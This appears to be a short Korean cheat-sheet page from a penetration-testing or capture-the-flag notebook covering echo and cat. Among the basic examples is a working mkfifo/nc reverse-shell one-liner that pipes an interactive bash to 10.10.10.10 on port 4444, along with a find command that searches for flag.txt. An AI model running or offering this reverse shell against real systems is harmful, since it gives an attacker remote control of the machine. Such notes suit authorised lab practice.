# echo / cat

- 문자열을 출력하는 echo와 파일 내용을 출력하는 cat의 기본 사용법과, mkfifo로 만든 파이프에 cat·nc를 연결해 리버스 셸 입출력을 구성하는 예시를 정리한 문서
- nc 리버스 셸을 받을 때 표준 입력을 셸에 연결하는 파이프를 세울 때, 그리고 출력 결과를 파일로 남기거나 grep·head로 좁힐 때 쓴다
- 리눅스 셸과 nc가 필요하고, cat으로 큰 파일을 통째로 출력하면 세션이 멈출 수 있으므로 필요한 만큼만 출력한다

## 개요

`echo`는 출력, `cat`은 파일 내용 출력. 보이지 않는 문자를 다루는 명령이라, 리버스 셸 세션에서 입력 파이프를 만들 때 자주 쓴다.

## echo

```bash
echo "hello"
echo -n "no newline"
```

## cat (파이프로 입력 받기)

```bash
# 리버스 셸의 일반적 사용 (reverse shell 문서 참고)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f
```

- `cat /tmp/f`는 파이프의 입력을 기다린다.
- `nc`가 접속을 받을 때 위 명령을 그대로 사용한다.

## 찾는 파일

```bash
find / -name "flag.txt" 2>/dev/null
```

- 결과를 파일로 남길 때: `find / -name "*.log" 2>/dev/null > /tmp/found.log`
- 결과가 많으면 `head`/`grep`으로 좁힌다.

## 주의

- 이 문서는 Linux 환경 기준이다.
- `cat`로 큰 파일을 계속 출력하면 세션이 멈춘다. 필요한 만큼만 출력한다.

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
